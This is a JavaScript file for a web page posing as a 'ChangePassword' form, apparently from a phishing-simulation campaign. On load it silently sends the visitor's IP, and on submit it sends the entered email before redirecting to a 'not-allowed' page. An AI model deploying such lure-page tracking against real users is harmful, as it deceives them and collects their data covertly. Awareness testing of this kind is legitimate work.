// ! Switch to live URL
// const rootUrl = "https://gpaphitis.github.io/ChangePassword";
const rootUrl = "http://localhost:5500";
let loaded=false;
let submitted=false;
document.addEventListener("DOMContentLoaded", () =>
{
   document.querySelector("#next").addEventListener("click", submit);
   document.querySelector("#cancel").addEventListener("click", clearForm);
   document.querySelector("#target-email").addEventListener("input", $formHandler.isEmailValid);
   window.addEventListener("resize", $footerHandler.placeFooterEnd);
   $footerHandler.placeFooterEnd();
   // ! Uncomment to enable email send upon loading of page
   $emailSender.sendIp("TJSS Clicked");
});
function clearForm()
{
   $formHandler.clearForm();
   // Clears specific invalid email error
   $formHandler.makeInvisible(document.querySelector("#email-error"));
}
function isEmailValid()
{
   if (document.querySelector("#target-email:invalid") != null) {
      $formHandler.makeVisible(document.querySelector("#email-error"));
      return false;
   }
   else {
      $formHandler.makeInvisible(document.querySelector("#email-error"));
      return true;
   }
}
function submit(e)
{
   e.preventDefault();
   let isFormCorrect = true;
   if ($formHandler.isFieldEmpty())
      isFormCorrect = false;
   if (!$formHandler.isEmailValid())
      isFormCorrect = false;
   if (isFormCorrect === true) {
      let email = document.querySelector("#target-email").value;
      // ! Uncomment to enable email send upon submitting
      $emailSender.sendEmail(email, "TJSS Submitted").then(() =>
      {
         window.location.replace(`${rootUrl}/cd2feffee199eea9354472021b566af07530d53d/not-allowed.html`);
      });
   }
}